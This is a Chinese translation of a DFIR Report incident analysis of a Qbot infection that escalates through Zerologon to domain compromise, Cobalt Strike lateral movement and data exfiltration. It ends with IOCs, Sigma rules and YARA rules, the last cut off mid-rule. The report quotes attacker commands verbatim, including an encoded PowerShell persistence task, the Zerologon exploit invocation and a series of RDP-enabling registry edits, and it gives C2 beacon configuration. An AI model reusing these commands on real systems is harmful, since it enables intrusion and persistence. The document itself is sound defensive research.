**译者：知道创宇404实验室翻译组  
原文链接：<https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/>**

在这次入侵中(从2021年11月开始)
，一个黑客通过使用[Qbot](https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot)(又名
Quakbot/Qakbot)恶意软件在环境中获得了最初的立足点。

在 Qbot 有效载荷执行后不久，恶意软件建立了 c2连接并在beachhead 长期存在。成功利用
[Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)漏洞(CVE-2020-1472)允许攻击者获得域管理员权限。这一级别的访问被用来部署额外的Cobalt
Strike信标，从而转向网络内的其他敏感主机。然后，攻击者在被驱逐出网络之前将敏感文档从环境中提取出来。

### 摘要

攻击者通过执行恶意 DLL 获得了对 Windows 工作站的初始访问权。QBot 的第一个活动是在 DLL
执行后5分钟发现的。各种各样的自动发现命令被用来映射网络拓扑，检索本地组成员信息，以及列出受感染用户的可用文件共享/特权。

在第一个发现阶段之后，Qbot 植入了另一个恶意 DLL 并创建了一个计划任务以获得持久性。计划任务的主要目的是每30分钟执行一个(base64编码的)
PowerShell Cobalt Strike 信标。

一旦攻击者建立了持久性，他们就会继续枚举环境，通过使用Nltest、net和ADFind等工具映射出Active Directory环境。

在识别出一个域控制器之后，攻击者开始利用 ZeroLogon 漏洞。使用的可执行文件与前一个案例[From Zero to Domain
Admin](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)中基于命令行参数和漏洞的总体执行使用的文件有惊人的相似性。命名为 cool.exe
的可执行文件将网域控制器密码重置为一个空字符串，检索域管理密码 Hash，并在 DC 上安装一个服务来重置 DC 密码，以免破坏Active
Directory操作。

然后，域管理散列通过一种over-pass-the-hash攻击在滩头上使用。在拥有域管理员特权之后，他们继续在一个文件服务器和另一个域控制器服务器上部署
Cobalt Strike 信标，这使得他们可以转向这些服务器。

最后，文件被盗并通过 Cobalt Strike 加密的 c2通道(HTTPS)进行泄露。而案件的结束点，就在黑客在完成任何进一步目标之前被驱逐出网络。

### Timeline 时间轴

![img](https://images.seebug.org/content/images/2022/02/22/1645520113000-1abvid.png-w331s)

分析和报告由[@pigerlin](https://twitter.com/pigerlin)和[@MetallicHack](https://twitter.com/MetallicHack)完成。

检测:[@ICSNick](https://twitter.com/IcsNick) 和
[@kostastsale](https://twitter.com/Kostastsale)

### 初始访问

攻击者通过执行恶意 DLL 获得了初始访问权限。传统上，Qbot 是通过使用恶意文档的电子邮件传递的，然后下载恶意
DLL。但是，在这次案例中，执行直接从[这里](https://tria.ge/211115-r554waafe6)找到的 qbot DLL 开始。

这种 QBot 感染的执行链如下:

![img](https://images.seebug.org/content/images/2022/02/22/1645520114000-2cvwqj.png-w331s)

### 执行

#### QBot PowerShell 分析

我们分析了定时任务`HKCU:\SOFTWARE\Pvoeooxf`查询的注册表路径和相关键，发现创建了三个包含
base64编码值的键。对这些值进行解码后得出:

  1. QBot DLL 的副本

  2. 由分号分隔的 QBot C2 ip 地址字符串

  3. 计划任务引用的模糊化 PowerShell 脚本

[![img](https://images.seebug.org/content/images/2022/02/22/1645520114000-3xetvy.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-02.png)

PowerShell 脚本(由定时任务触发)启动一系列事件，如下所示:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520115000-4zdehr.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-03.png)

在第一次运行时，脚本在相同的路径中创建一个新的注册表项，保存执行日期。然后在执行时验证此注册表项的创建日期键是否超过4小时。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520116000-5bzaku.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-04.png)

根据结果，它将: (1)从 Windows 注册表中检索 base64编码的 Qbot 有效负载，对其进行解码，将其保存在文件系统中并执行它。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520116000-6xifop.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-05.png)

或者(2)借助`Invoke-WebRequest`PowerShell 模块使用的一个活动的 C2 ip 远程获取 QBot 有效负载:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520117000-7pague.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-06.png)

PS 脚本包含执行各种类型有效负载（）包括批处理和 visualbasic 文件）的内置逻辑。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520119000-8jrtwz.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-07.png)

存储在注册表中的经过编码的 QBot DLL 被植入在目录`%APPDATA%\Roaming\Microsoft\Fdopitcu`中。这个无符号
DLL带有描述符`Cancel Autoplay 2`，使用`regsvr32.exe`执行

[![img](https://images.seebug.org/content/images/2022/02/22/1645520120000-9kgtey.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-08.png)

[![img](https://images.seebug.org/content/images/2022/02/22/1645520121000-10swbpm.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-09.png)

在执行这个第二阶段 DLL 时，`HKCU\Software\Microsoft\Yerqbqokc.`里创建了各种注册表项。此外，还启动了一个新的
explorer.exe 实例(32bit) ，并将其注入。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520122000-11sjtwi.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-10.png)

注册表键包含八个字符长的十六进制字符串，我们认为这是恶意软件的加密[配置](https://www.binarydefense.com/qakbot-upgrades-to-stealthier-persistence-method/)的一部分。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520122000-12mdehk.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-11.png)

### 持久性

#### Beachhead 的计划任务

由 Qbot 创建的计划任务被设置为每30分钟运行一次，并执行存储在 Windows 注册表中的 base64编码的有效负载。

    
    
    schtasks.exe /Create /F /TN "{97F2F70B-10D1-4447-A2F3-9B070C86E261}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Pvoeooxf).yzbbvhhdypa))) " /SC MINUTE /MO 30

[![img](https://images.seebug.org/content/images/2022/02/22/1645520123000-13elmgo.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-12.png)

    
    
    LogName: Microsoft-Windows-TaskScheduler/Operational 
    EventCode: 106
    Message: Task scheduler Task Registered

### 权限提升

在获得初始访问权限30分钟后，攻击者在Beachhead运行一个可执行文件，利用 CVE-2020-1472，Zerologon漏洞。

可执行文件名为“ cool.exe”:

    
    
    C:\Windows\system32\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c "taskkill /f /im explorer.exe"

[![img](https://images.seebug.org/content/images/2022/02/22/1645520124000-14fxynb.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-13.png)

在 [Zerologon](https://blogs.blackberry.com/en/2021/03/zerologon-to-ransomware)
攻击后3毫秒后，事件4742“计算机帐户被更改”在目标网域控制器上产生了。

正如[CrowdStrike](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)在一篇详细的博客中所解释的那样，ZeroLogon CVE 依赖于与 zero IV 一起使用的 AES-CFB8
算法:

> “为了安全地使用 AES-CFB8，需要为每个明文生成一个随机初始向量(IV)
> ，以使用相同的密钥进行加密。但是，ComputeNetlogonCredential 函数将 IV
> 设置为16个零字节的固定值。这导致了一个加密漏洞，即8字节的零的加密可以产生零的密文，其概率为1/256。未加密的 Netlogon
> 会话未被服务器拒绝(默认情况下)的时候也会因此此攻击。这两个漏洞的结合可能使攻击者完全破坏身份验证，从而假冒他们选中的服务器。”

正如我们在网络图片中看到的，为了伪造域控制器的身份，进行了强制攻击:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520129000-15pntin.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-14.png)

在强力通信结束之后，我们可以看到一个单独的实例，其中一个漏洞已经成功完成。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520130000-16zmwzv.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-15.png)

成功验证后，设置了 DC 密码:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520131000-17hwgaw.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-16.png)

PasswordLastSet 字段等于 TimeCreated 字段，这意味着域控制器的密码已经成功更新。我们还可以看到 SubjectUserName
是匿名登录。

黑客使用 DC 帐户执行了从beachhead到域控制器的连接。在使用 DC 帐户对 DC 进行身份验证之后，黑客将植入 Domain Admin
散列，然后重置 DC 密码以恢复 activedirectory 域。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520133000-18geybe.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-17.png)

explorer shell也被黑客重新启动:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520134000-19rrsvh.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-18.png)

### Defense 回避

在执行初始 DLL 时，QBot 使用进程空洞化来启动 explorer.exe (32位)的挂起实例，然后将自身注入到这个进程中。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520135000-20ngkcp.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-21.png)

注入的 explorer.exe 进程用于生成并注入到 explorer.exe (32位)的其他实例中。下面可以看到一个示例事件。源码 PID
10492属于 QBot，注入一个 DLL 到 PID 4072，我们发现这是Cobalt Strike c2通信的一部分。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520136000-21jsixi.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-22.png)

#### 来自 Beachhead 的 Over-Pass-the-Hash

攻击者通过 Zerologon 漏洞获得管理员帐户的 NTLM 散列值，并使用 over-pass-The-hash 向管理网域控制器请求
TGT。我们以前已经看到过几次使用over-pass-the-hash的情况。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520137000-22bopsv.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-19.png)

不久之后，攻击者要求为管理员账户提供一个 TGT:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520137000-23bqrmp.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-20.png)

### 发现

QBot 最初会启动许多进程来收集关于受影响系统的信息。这是“SYSTEM INFO” bot 请求的一部分，如 secureist
最近的一篇[文章](https://securelist.com/qakbot-technical-analysis/103931/)所述。

![img](https://images.seebug.org/content/images/2022/02/22/1645520138000-24myefa.png-w331s)

后来，攻击者通过 Cobalt Strike 信标执行了更多的discovery命令，收集有关活动目录环境的信息。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520138000-25oisat.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-24.png)

ADFind (在find.exe中重命名)用于枚举计算机

    
    
    C:\redacted\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName

![img](https://images.seebug.org/content/images/2022/02/22/1645520139000-26odqkb.png-w331s)

在域控制器上，攻击者通过WMI收集有关已安装安全软件的信息:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520140000-27ugtlw.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-26.png)

    
    
    C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value
    C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
    C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value

Ping 被用来验证机器是否在线

    
    
    ping -n 1 [REDACTED]

### 横向移动

通过创建 Windows 服务，Cobalt Strike 信标(psexec_psh 函数)被部署在环境中的多台主机上。

    
    
    EventCode: 7045
    Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted>
    User: NT AUTHORITY\SYSTEM
    ParentImage: C:\Windows\System32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe

在第一个域控制器上，Cobalt Strike 服务被安装了:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520143000-28mityb.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-27.png)

    
    
    Log Source: Microsoft-Windows-Service Control Manager Event ID:7045

Cobalt Strike 在整个环境中安装了多种服务，以下是一些例子:

    
    
    HKLM\System\CurrentControlSet\Services\3141131\ImagePath 
    HKLM\System\CurrentControlSet\Services\af5ff02\ImagePath 
    HKLM\System\CurrentControlSet\Services\c46234f\ImagePath

Cobalt Strike 首先调用 **OpenSCManagerW** 远程创建服务，然后用 **StartServiceA** 函数启动它:

[![img](https://images.seebug.org/content/images/2022/02/22/1645520145000-29nihsv.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-28.png)

#### RDP/交互式登录

黑客在不同的主机上执行不同的命令来启用 RDP 服务:

增加允许的最大 RDP 连接数，在这种情况下是任意大的数量。

    
    
    REG  ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v "MaxInstanceCount" /d 0xffffffff /f

确保启用了 RDP 侦听器。

    
    
    REG  ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v "fEnableWinStation" /d 1 /f

确保允许用户 RDP 到终端服务器。

    
    
    REG  ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSUserEnabled" /d 0 /f

确保终端服务器设置为启用。

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSEnabled" /d 1 /f

确保终端服务设置为远程管理模式。

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSAppCompat" /d 0 /f

确保终端服务将启动空闲会话。

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "IdleWinStationPoolCount" /d 1 /f

启用终端服务器的广告。

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSAdvertise" /d 1 /f

确保终端服务器设置为允许连接。

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "AllowTSConnections" /d 1 /f

确保终端服务器设置为同步会话。

    
    
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /t REG_DWORD /v "EnableConcurrentSessions" /d 1 /f

确保允许多个会话。

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "fSingleSessionPerUser" /d 0 /f

启动终端服务并将服务设置为自动启动。

    
    
    sc config termservice start= auto
    net  start termservice /y

然后，攻击者建立交互式管理 RDP 会话，并转移到网络中的不同主机。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520146000-30weoiu.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-29.png)

    
    
    LogName=Security
    EventCode=4624
    Logon Type=10 (Remote Interactive Logon - RDP)

### Named pipe (SMB)

### 命名管道(SMB)

Base64编码的有效载荷可以使用 Cyberchef
[配方](https://gist.github.com/0xtornado/69d12572520122cb9bddc2d6793d97ab)（由
[@0xtornado](https://twitter.com/0xtornado)提出) 进行解码，该配方代表一个 SMB
信标，创建命名管道“dce_3d”。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520147000-31qccmh.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-30.png)

[![img](https://images.seebug.org/content/images/2022/02/22/1645520148000-32lplwq.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-31.png)

    
    
    LogName=Microsoft-Windows-System/Operational
    EventCode=17
    TaskCategory=Pipe Created (rule: PipeEvent)

### Command and Control

#### QBot 细节 -24.229.150.54//41.228.22.180

24.229.150[.]54:995 / avlhestito[.]us

    
    
    Certificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce
    Not Before  2021/11/15 09:24:49 UTC 
    Not After  2022/11/15 13:18:32 UTC 
    Issuer Org  Rsc Inpye LLC. 
    Subject Common  avlhestito[.]us
    Public Algorithm  rsaEncryption
    JA3: c35a61411ee5bdf666b4d64b05c29e64
    JA3s: 7c02dbae662670040c7af9bd15fb7e2f

41.228.22[.]180:443 / xrhm[.]info

    
    
    Certificate:    96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7
    Not     Before:  2021/11/12 04:34:10 UTC 
    Not After:      2022/11/12 10:08:57 UTC 
    Issuer Org:  Bqatra Bamito Inc. 
    Subject Common:  xrhm[.]info
    Public Algorithm:  rsaEncryption
    JA3:  c35a61411ee5bdf666b4d64b05c29e64
    JA3s: 7c02dbae662670040c7af9bd15fb7e2f

下面是来自[Tria.ge](https://tria.ge/211115-r554waafe6/behavioral2)的初始访问 DLL
(Qbot)信息

[![img](https://images.seebug.org/content/images/2022/02/22/1645520150000-33azzcy.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-32.png)

Cobalt Strike细节-5.255.98[.]144

这个Cobalt Strike服务器于2021年11月16日被添加到我们的[Threat
Feed](https://thedfirreport.com/services/)。

5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com

    
    
    Certificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]
    Not Before: 2021/11/07 03:00:53 UTC     
    Not After: 2022/02/05 03:00:52 UTC      
    Issuer Org: Let's Encrypt   
    Subject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com
    Public Algorithm: rsaEncryption
    JA3: 0eecb7b1551fba4ec03851810d31743f
    JA3s: ae4edc6faf64d08308082ad26be60767

配置:

    
    
    {
        "x64": {
            "uri_queried": "/tRPG",
            "sha256": "dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb",
            "config": {
                "HTTP Method Path 2": "/faq",
                "Jitter": 79,
                "C2 Server": "dxabt[.]com,/case",
                "Spawn To x86": "%windir%\\syswow64\\runonce.exe",
                "Method 1": "GET",
                "C2 Host Header": "",
                "Method 2": "POST",
                "Watermark": 426352781,
                "Spawn To x64": "%windir%\\sysnative\\runonce.exe",
                "Beacon Type": "8 (HTTPS)",
                "Port": 443,
                "Polling": 53988
            },
            "time": 1637416040175.3,
            "md5": "30cc71d5b5d7778774c54486558690d3",
            "sha1": "5f36c6cffdbae0d631c8889b4d9bad1248f899b3"
        },
        "x86": {
            "uri_queried": "/Mr0m",
            "sha256": "a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f",
            "config": {
                "HTTP Method Path 2": "/faq",
                "Jitter": 79,
                "C2 Server": "dxabt[.]com,/case",
                "Spawn To x86": "%windir%\\syswow64\\runonce.exe",
                "Method 1": "GET",
                "C2 Host Header": "",
                "Method 2": "POST",
                "Watermark": 426352781,
                "Spawn To x64": "%windir%\\sysnative\\runonce.exe",
                "Beacon Type": "8 (HTTPS)",
                "Port": 443,
                "Polling": 53988
            },
            "time": 1637416038974.9,
            "md5": "c1fd49c043894c1dff8bc02b17f8942c",
            "sha1": "e915f74be310b1687db6b290af2f78583a981512"
        }
    }

### 泄露

当攻击者在环境中活动时，我们收到了3个不同的警告，声称有人从 IP 地址
91.193.182[.]165打开了canary文档。这些警报告诉我们，数据确实是从环境中泄露出来的。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520150000-34ocstp.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-33.png)

攻击者最感兴趣的是有关财务报表、勒索软件报告和薪水数据的文件。

c2通道被加密了 ，并与内部文件服务器建立了多个连接。没有观察到可能的外泄的其他通信，我们得出结论，C2通道是用来进行信息提取的。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520151000-35lsdgj.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-34.png)

时间17:35，Cobalt Strike信标被部署在文件服务器上。

根据每分钟从 File Server 到 c2的连接数，我们可以得出结论，信息泄露是在时间17:52到18:00之间完成的。

[![img](https://images.seebug.org/content/images/2022/02/22/1645520153000-36fcmpb.png-w331s)](https://thedfirreport.com/wp-content/uploads/2022/02/8734-35.png)

文件共享服务器到 Cobalt Strike 命令和控制服务器的流量高峰。

### IOCs

### Network

    
    
    QBOT
    24.229.150[.]54:995  - avlhestito[.]us
    41.228.22[.]180:443 - xrhm[.]info 
    
    Cobalt Strike
    5.255.98[.]144:8888 / dxabt[.]com
    5.255.98[.]144:443 / dxabt[.]com
    5.255.98[.]144:8080 / dxabt[.]com

### File

    
    
    Intial Exec Qbot DLL
    MD5:53510e20efb161d5b71c4ce2800c1a8d
    SHA1:2268178851d0d0debb9ab457d73af8a5e50af168
    SHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987
    
    QBot DLL (extracted from registry):
    MD5:312e52b4109741893f17bc524084100f
    SHA1:7ca650945223eab088f43fd472e3592be2ed9d32
    SHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b
    
    cool.exe
    MD5:59E7F22D2C290336826700F05531BD30
    SHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1
    SHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0

## Detections

### Network (More ET rules coming 2/23/22)

    
    
    ET POLICY Powershell Activity Over SMB - Likely Lateral Movement
    ET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement
    ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
    ET CNC Feodo Tracker Reported CnC Server group 15
    ET CNC Feodo Tracker Reported CnC Server group 16
    
    The following rules may cause performance issues (and are disabled by default) according to @ET_Labs
    ET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870
    ET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871 
    ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888
    ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889

### Sigma

    
    
    title: Scheduled task executing powershell encoded payload from registry
    status: Experimental
    description: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.
    author: @Kostastsale, @TheDFIRReport
    references: 
      - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
    date: 2022/02/12
    logsource:
      product: windows
      category: process_creation
    detection:
      selection1:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains|all:
          - '/Create'
          - '/SC'
      selection2:
        CommandLine|contains|all:
          - 'FromBase64String'
          - 'powershell'
          - 'Get-ItemProperty'
          - 'HKCU:'
      condition: selection1 and selection2
    falsepositives:
      - Uknown
    level: high
    tags:
      - attack.execution
      - attack.persistence
      - attack.t1053.005
      - attack.t1059.001
    title: Execution of ZeroLogon PoC executable
    status: Experimental
    description: Detects the execution of the commonly used ZeroLogon PoC executable.
    author: @Kostastsale, @TheDFIRReport
    references: 
      - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/
      - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
    date: 2022/02/12
    logsource:
      product: windows
      category: process_creation
    detection:
      selection1:
        ParentImage|endswith: 
          - '\cmd.exe'
        Image|endswith: 
          - '\cool.exe'
          - '\zero.exe'
        CommandLine|contains|all:
          - 'Administrator'
          - '-c'
      selection2:
        CommandLine|contains|all:
          - 'taskkill'
          - '/f'
          - '/im'
      selection3:
        CommandLine|contains:
          - 'powershell'
      condition: selection1 and (selection2 or selection3)
    falsepositives:
      - Uknown
    level: high
    tags:
      - attack.execution
      - attack.lateral_movement
      - attack.T1210
    title:  Enabling RDP service via reg.exe command execution
    status: Experimental
    description: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host 
    author: @Kostastsale, @TheDFIRReport
    references: 
      - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
    date: 2022/02/12
    logsource:
      product: windows
      category: process_creation
    detection:
      selection1:
        Image|endswith: 
          - '\reg.exe'
        CommandLine|contains|all:
          - 'add'
          - 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server'
          - 'REG_DWORD'
      Winstations1:
        CommandLine|contains:
          - 'WinStations\RDP-Tcp'
      Winstations2:
        CommandLine|contains:
          - 'MaxInstanceCount'
          - 'fEnableWinStation'
      selection2:
        CommandLine|contains|all:
          - 'Licensing Core'
          - 'EnableConcurrentSessions'
      selection3:
        CommandLine|contains:
          - 'TSUserEnabled'
          - 'TSEnabled'
          - 'TSAppCompat'
          - 'IdleWinStationPoolCount'
          - 'TSAdvertise'
          - 'AllowTSConnections'
          - 'fSingleSessionPerUser'
      condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))
    falsepositives:
      - Uknown
    level: high
    tags:
      - attack.defense_evasion
      - attack.lateral_movement
      - attack.t1021.001
      - attack.t1112

  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_pass_the_hash_2.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry_event/sysmon_powershell_as_service.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry_event/sysmon_cobaltstrike_service_installs.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_net_execution.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/sysmon_mal_cobaltstrike.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_nltest_recon.yml>
  * <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_whoami.yml>

### Yara

    
    
    /*
       YARA Rule Set
       Author: The DFIR Report
       Date: 2022-02-20
       Identifier: Case 8734
       Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
    */
    
    
    /* Rule Set ----------------------------------------------------------------- */
    
    
    import "pe"
    
    
    rule qbot_8734_payload_dll {
       meta:
          description = "files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987"
          author = "The DFIR Report"
          reference = "https://thedfirreport.com"
          date = "2022-02-20"
          hash1 = "e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987"
       strings:
          $s1 = "Terfrtghygine.dll" fullword ascii
          $s2 = "Winamp can read extended metadata for titles. Choose when this happens:" fullword wide /* Goodware String - occured 1 times */
          $s3 = "Read metadata when file(s) are loaded into Winamp" fullword wide /* Goodware String - occured 1 times */
          $s4 = "Use advanced title formatting when possible" fullword wide /* Goodware String - occured 1 times */
          $s5 = "PQVW=!?" fullword ascii
          $s6 = "Show underscores in titles as spaces" fullword wide /* Goodware String - occured 1 times */
          $s7 = "Advanced title display format :" fullword wide /* Goodware String - occured 1 times */
          $s8 = "CreatePaint" fullword ascii
          $s9 = "PQRVW=2\"" fullword ascii
          $s10 = "Advanced Title Formatting" fullword wide /* Goodware String - occured 1 times */
          $s11 = "Read metadata when file(s) are played or viewed in the playlist editor" fullword wide /* Goodware String - occured 1 times */
          $s12 = "Show '%20's in titles as spaces" fullword wide /* Goodware String - occured 1 times */
          $s13 = "Example : \"%artist% - %title%\"" fullword wide /* Goodware String - occured 1 times */
          $s14 = "PQRVW=g" fullword ascii
          $s15 = "PQRW=e!" fullword ascii
          $s16 = "ATF Help" fullword wide /* Goodware String - occured 1 times */
          $s17 = "(this can be slow if a large number of files are added at once)" fullword wide /* Goodware String - occured 1 times */
          $s18 = "PQRVW=$" fullword ascii
          $s19 = "Metadata Reading" fullword wide /* Goodware String - occured 1 times */
          $s20 = "Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ..." fullword wide /* Goodware String - occured 1 times */
       condition:
          uint16(0) == 0x5a4d and filesize < 2000KB and
          ( pe.imphash() == "aa8a9db10fba890f8ef9edac427eab82" and pe.exports("CreatePaint") or 8 of them )
    }
    
    
    rule qbot_dll_8734 {
       meta:
          description = "files - qbot.dll"
          author = "TheDFIRReport"
          reference = "QBOT_DLL"
          date = "2021-12-04"
          hash1 = "4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b"
       strings:
          $s1 = "Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc" wide
          $s2 = "IDAPI32.DLL" fullword ascii
          $s3 = "ResetUsageDataActnExecute" fullword ascii
          $s4 = "idapi32.DLL" fullword ascii
          $s5 = "ShowHintsActnExecute" fullword ascii
          $s6 = "OnExecute@iG" fullword ascii
          $s7 = "OnExecutexnD" fullword ascii
          $s8 = "ShowShortCutsInTipsActnExecute" fullword ascii
          $s9 = "ResetActnExecute " fullword ascii
          $s10 = "RecentlyUsedActnExecute" fullword ascii
          $s11 = "LargeIconsActnExecute" fullword ascii
          $s12 = "ResetActnExecute" fullword ascii
          $s13 = "OnExecute<" fullword ascii
          $s14 = "TLOGINDIALOG" fullword wide
          $s15 = "%s%s:\"%s\";" fullword ascii
          $s16 = ":\":&:7:?:C:\\:" fullword ascii /* hex encoded string '|' */
          $s17 = "LoginPrompt" fullword ascii
          $s18 = "TLoginDialog" fullword ascii
          $s19 = "OnLogin" fullword ascii
          $s20 = "Database Login" fullword ascii
       condition:
